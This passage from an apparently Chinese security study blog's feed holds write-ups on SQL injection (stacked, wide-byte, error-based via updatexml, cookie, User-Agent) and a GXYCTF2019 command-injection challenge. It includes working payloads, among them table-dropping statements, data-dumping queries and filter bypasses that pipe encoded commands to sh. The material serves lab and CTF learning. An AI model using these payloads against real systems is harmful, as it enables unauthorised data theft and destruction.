</span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string">  12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string">  14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string">  38 </span>|<span class="hljs-string"> less38   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  39 </span>|<span class="hljs-string"> less39   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 109 </span>|<span class="hljs-string"> hello</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  40 </span>|<span class="hljs-string"> less40   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 110 </span>|<span class="hljs-string"> less41</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 144 </span>|<span class="hljs-string"> less44</span>|<span class="hljs-string"> hello      </span>|<br><br>+-----+----------+------------+<br><br>19 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><h2 id="7-Less-45-报错型堆叠注入-字符型-POST"><a href="#7-Less-45-报错型堆叠注入-字符型-POST" class="headerlink" title="7.Less-45 报错型堆叠注入 - 字符型 - POST"></a>7.Less-45 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-variable">$username</span>&#x27;) and password=(&#x27;<span class="hljs-variable">$password</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>（2）测试</p><p>登录前测试增加表</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username :  admin<br><br>password :  c&#x27;);<span class="hljs-keyword">create</span> table less45 like users<span class="hljs-meta">#   <span class="hljs-comment">//创建了less45表</span></span><br></code></pre></td></tr></table></figure><p>登录后查看增加表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> less45</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>登录前测试删除表</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">username： admin<br><br>password ： c&#x27;);<span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> less45<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>登录后查看删除表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆叠注入 stacked  injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>宽字节注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。</p><p><strong>字符集:</strong> 也叫字符编码，是一种将符号转换为二进制数的映射关系。几种常见的字符集:<br> <strong>·ASCII编码:</strong> 单字节编码。<br> <strong>·gbk编码:</strong> 使用一字节和双字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。双字节的第一字节范围是0x81-0xFE。<br> <strong>·UTF-8编码:</strong> 使用一至四字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。其它字符用二至四个字节变长表示。<br><strong>宽字节:</strong> 就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p><p>通常来说，一个gbk编码汉字，占用<strong>2个</strong>字节。一个utf-8编码的汉字，占用<strong>3个</strong>字节。在php中，我们可以通过输出echo strlen(“和”);来测试</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>宽字节注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GXYCTF2019]Ping Ping Ping</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DPing%20Ping%20Ping/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DPing%20Ping%20Ping/</url>
    
    <content type="html"><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>​<code>?ip=127.0.0.1;ls</code>​</p><blockquote><p>&#x2F;?ip=<br> PING 127.0.0.1 (127.0.0.1): 56 data bytes<br> flag.php<br> index.php</p><p>滤了空格和标点，flag等符号，不能直接cat flag</p></blockquote><p>‍</p><p>​<code>?ip=127.0.0.1;cat flag.php</code>​</p><blockquote><p>&#x2F;?ip= fxck your space!</p><p>过滤了空格，用<code>$&#123;IFS&#125;$</code>​代替</p></blockquote><p>‍</p><p>​<code>?ip=127.0.0.1;cat$IFSflag.php</code>​</p><blockquote><p>&#x2F;?ip= fxck your flag!</p></blockquote><p>‍</p><p>不读flag，读index</p><blockquote><p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">/?ip=<br>PING <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>): <span class="hljs-number">56</span> data bytes<br>/?ip=<br>|\<span class="hljs-string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-string">    die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your space!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your bash!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your flag!&quot;);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-string">  echo &quot;</span><br><span class="hljs-string">&quot;;</span><br><span class="hljs-string">  print_r($a);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>总结：过滤的特殊字符：</strong></p><blockquote><p>&amp; &#x2F; ？ * &lt; x{00}-\x{1f} ‘ “ \ () [] {}  空格<br>“xxxfxxxlxxxaxxxgxxx” “ “ “bash”</p></blockquote><p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br></code></pre></td></tr></table></figure></blockquote><p>源码中有一个$a变量可以覆盖</p><blockquote><p>?ip&#x3D;127.0.0.1;a&#x3D;f;cat$IFS$1$alag.php    过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;l;cat$IFS$1f$aag.php没flag<br>?ip&#x3D;127.0.0.1;a&#x3D;a;cat$IFS$1fl$ag.php  过滤<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php有flag<br>?ip&#x3D;127.0.0.1;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php 过滤<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p></blockquote><p>变量替换顺序，效果也不一样</p><h3 id="1、简单变量替换，用-a覆盖拼接flag"><a href="#1、简单变量替换，用-a覆盖拼接flag" class="headerlink" title="1、简单变量替换，用$a覆盖拼接flag"></a>1、简单变量替换，用$a覆盖拼接flag</h3><p>​<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>​</p><p>​<code>查看源码</code>​</p><p>&#x2F;?ip=</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">PING <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>): <span class="hljs-number">56</span> data bytes &lt;?php $flag =<br><br>“flag&#123;d893b431-<span class="hljs-number">5300</span>-<span class="hljs-number">4b46</span>-<span class="hljs-number">9b52</span>-3a5a2390cfca&#125;”; ?&gt;<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="2、变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#2、变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="2、变量ab互换传递，绕过字符串匹配，实现拼接"></a>2、变量ab互换传递，绕过字符串匹配，实现拼接</h3><p>​<kbd>?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</kbd>​</p><p>​<kbd>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</kbd>​</p><p>‍</p><h3 id="3、内联执行"><a href="#3、内联执行" class="headerlink" title="3、内联执行"></a>3、内联执行</h3><blockquote><p>?ip&#x3D;127.0.0.1;cat$IFS<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$3<code>ls</code>​<br>?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code>​<br>?ip&#x3D;127.0.0.1|cat$IFS$9<code>ls</code>​</p></blockquote><p>‍</p><h3 id="4、被过滤的bash，用管道-sh替换"><a href="#4、被过滤的bash，用管道-sh替换" class="headerlink" title="4、被过滤的bash，用管道+sh替换"></a>4、被过滤的bash，用管道+sh替换</h3><p>cat flag.php用base64加密来绕过正则匹配</p><blockquote><p>Y2F0IGZsYWcucGhw</p></blockquote><blockquote><p>?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</p></blockquote><p>&#x2F;&#x2F;?ip= fxck your bash!</p><p> 过滤了flag、bash，但sh没过滤，linux下可用sh</p><p>​<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code>​</p><p>|sh 就是执行前面的echo脚本</p><p>‍</p><h3 id="5、类似题的大概思路"><a href="#5、类似题的大概思路" class="headerlink" title="5、类似题的大概思路"></a>5、类似题的大概思路</h3><blockquote><p>cat fl*  用<em>匹配任意<br>cat fla</em> 用*匹配任意<br>ca\t fla\g.php        反斜线绕过<br>cat fl’’ag.php        两个单引号绕过<br>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash<br>&#x2F;&#x2F;base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</p><p>echo “63617420666c61672e706870” | xxd -r -p | bash<br>&#x2F;&#x2F;hex编码绕过(引号可以去掉)</p><p>echo “63617420666c61672e706870” | xxd -r -p | sh<br>&#x2F;&#x2F;sh的效果和bash一样</p><p>cat fl[a]g.php       用[]匹配</p><p>a&#x3D;fl;b&#x3D;ag;cat $a$b          变量替换<br>cp fla{g.php,G}    把flag.php复制为flaG<br>ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x&gt;&#x3D;10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的</p></blockquote><p>‍</p><p>通配符</p><blockquote><ul><li>#匹配全部字符，通配符<br>?    #任意一个字符，通配符<br>[]      #表示一个范围（正则，通配符）<br>{}      #产生一个序列（通配符）</li></ul></blockquote><p><img src="/.com//b1bf09fa6702388534a63ae4b934053c-20250416004020-dh62fi5.png" alt="b1bf09fa6702388534a63ae4b934053c"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>命令注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>[GXYCTF2019]Ping Ping Ping</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>报错注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>1、报错注入的分类</p><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以把MySQL报错注入分为以下几类：</p><pre><code class="hljs">· Biglnt等数据类型溢出· xpath语法错误· count()+rand()+group_by()导致主键重复· 空间数据类型函数错误</code></pre><p>‍</p><p><strong>xpath语法错误</strong></p><p>从<strong>mysql5.1.5</strong>开始提供了两个<strong>XML</strong>查询和修改的函数:</p><p>1.<strong>updatexml():</strong> 适用于5.5.5-5.5.49版本<br>2.extractvalue():适用于5.1.5+版本</p><p>可以通过xml函数报错，来显示注入命令执行结果。</p><p><strong>updatexml函数格式:</strong> updatexml((XML_document, XPath_string, new_value)</p><p> <strong>·XML_document:</strong> xml文档的名称。</p><p> <strong>·XPath_string:</strong> xpath格式的字符串</p><p> <strong>·new_value:</strong> 替换查找到的符合条件的数据</p><p><strong>extractvalue函数格式:</strong> extractvalue((XML document,XPath string)，除了没有第三个参数</p><p>(new_value)，其它与updataxml()函数完全一样。所以后面只讲updatexml()函数的使用。</p><p>简而言之，updatexml函数功能就是查找一个字符串，并进行替换。而我们在XPath</p><p>string处也就是第二个参数那里传入不符合xpath格式的特殊字符，并加上一些查询语</p><p>句，mysql就会把错误和查询语句的结果报错显示出来。这就是xpath报错注入的原理，</p><p><strong>注意事项:</strong></p><p>·必须是在<strong>XPath_string</strong>处传特殊字符，mysql才会报错，同时我们还需要注入命令，没这</p><p>么多位置，所以要用到concat函数。</p><p> <strong>·xpath</strong>只会对特殊字符进行报错，这里我们可以用16进制的0x7e(~)来进行利用。</p><p>·<strong>xpath</strong>只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分</p><p>段输出。</p><p><strong>函数说明：</strong><br> <strong>·concat(s1,s2…sn):</strong> 将字符串s1,s2…sn合并为一个字符串。</p><p>·<strong>substr(s,start,length):</strong> 从字符串s的 start 位置截取长度为 length 的子字符串，start从<strong>1</strong>开始。</p><p>‍</p><blockquote><h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><p>1、寻找注入点2、判断字符型还是数字型3、判断闭合方式</p><p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p><p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p><p><strong>5、使用updatexml查找表名</strong></p><p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p><p><strong>6、使用updatexmml查询列名</strong></p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p><p><strong>7、查询具体数据</strong></p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p></blockquote><h3 id="思考一下，为什么要这么构造攻击语句"><a href="#思考一下，为什么要这么构造攻击语句" class="headerlink" title="思考一下，为什么要这么构造攻击语句?"></a>思考一下，为什么要这么构造攻击语句?</h3><p>首先回到语法格式上:updatexml((XML_document,XPath_string,new_value)，我们必须在XPath_string这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容目的是满足三个参数。<br>但是由于xpath只会对<strong>特殊字符</strong>进行报错（还有其他字符也可以实现），这里我们可以用~，16进制的0x7e来进行利用，所以就变成了updatexml(1,0x7edataase()0x7e,1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database(),0x7e),1)</p><p>‍</p><p>思考:为什么中间的查询语句外面要括号括起来?</p><p>因为concat()，中间<strong>不允许有空格</strong>，所以需要括号括起来把变成一个整体。<br><strong>concat()</strong> 函数无法将多行合并为一行，所以可以先用group_conat()函数将多行合并为一行。</p><p>‍</p><p>‍</p><p>报错注入主要是利用updatexml()函数，其它方法偶尔会用到，这里集中介绍。<br>rend()+group()+count():虚拟表报错</p><p>获取数据库名<br>select 1 from(select</p><p>count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;#concat()的第二个参数是查询的命令，这里是database()获取表名<br>select 1 from(select count(</em>),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;<br>获取列名<br>select 1from(select count(</em>),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a;</p><p>获取数据<br>select 1 from(select count(*),concat((select (select (select concat(0x7e,first_name,0x7e)))from users limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;</p><p>或者使用下面的payload：</p><p>获取数据库名<br>select count(*),concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p><p>获取表名<br>select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p><p>获取列名<br>select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’limit 0,1),0x7e,floor(rand(0)*2))as a  from information_schema.tables group by a;</p><p>获取数据<br>select count(*),concat((select first name from users limit 0,1),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;</p><p>（rand：生成0~1的随机数 floor向下取整）</p><p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;（会有一个虚拟的表group，因为floor是向下取整的，只会随机出来0或者1的值所以当键值插入相同的时候就会键值冲突，冲突就会报错出来）</p><p>‍</p><blockquote><p> <strong>·几何函数:以下payload未测试</strong><br>GeometryCollection: id&#x3D;1 AND GeometryCollection((select * from(select * from(select user())a)b)polygon():id&#x3D;1 AND polygon((select * from(select *from(select user())a)b))multipoint():id&#x3D;l AND multipoint((select * from(select *from(select  user())a)b))multilinestring():id&#x3D;1 AND multilinestring((select *from(select * from(select user())a)b))linestring():id&#x3D;1 AND LINESTRING((select *from(select * from(select user())a)b))multipolygon():id&#x3D;1 AND multipolygon((select *from(selectfrom(select user())a)b))</p><p>‍</p><p><strong>name_const:</strong>  仅可用于获取数据库版本信息</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>报错注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cookie 注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><hr><p>cookie注入的原理是：就是修改cookie的值进行注入</p><p>♦cookie注入其原理也和平时的注入一样，只不过注入参数换成了cookie</p><p>♦要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><hr><p>两个必须条件：</p><ul><li>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</li><li>在条件1的基础上还需要程序对提交数据获取方式是直接<code>request(&quot;xxx&quot;)</code>​的方式，<strong>未指明</strong>使用request对象的具体方法进行获取，也就是说<u>用request这个方法的时候获取的参数可以是在URL后面的参数，也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</u></li></ul><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cookie 注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>User-Agent 注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="User-Agent-注入"><a href="#User-Agent-注入" class="headerlink" title="User-Agent 注入"></a>User-Agent 注入</h1><p>我们访问 <a href="http://127.0.0.1/sqli/Less-18/">http://127.0.0.1/sqli/Less-18/</a>，页面显示一个登陆框和我们的ip信息。</p><p>当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent。</p><p><img src="/.com//image-20250519103817-3j29chv.png" alt="image"></p><p>抓包，修改其User-Agent如下图，测试是否存在user-agent注入</p><p><img src="/.com//image-20250519103833-uzzkn29.png" alt="image"></p><p>页面报错，存在报错注入</p><p><img src="/.com//image-20250519103843-0hzuo2m.png" alt="image"></p><p>​<code>&#39; and extractvalue(1,concat(0x7e,database(),0x7e))and &#39;1&#39;=&#39;1 #</code>​我们可以将 database()修改为任何的函数</p><p>可以看到，页面将当前的数据库显示出来了。</p><p><img src="/.com//image-20250519103901-b4xcu6i.png" alt="image"></p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>User-Agent 注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆叠注入</title>
    <link href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 一条语句结束后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（union注入）也是将两条语句合并在一起，两者之间有什么区别呢？区别就在于union 或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：root’;DROP database user；服务器端生成的sql语句为：select * from user where name&#x3D;’root’;DROP database user；当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>注入漏洞</category>
      
      <category>SQL注入</category>
      
      <category>sql注入总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆叠注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次注入</title>
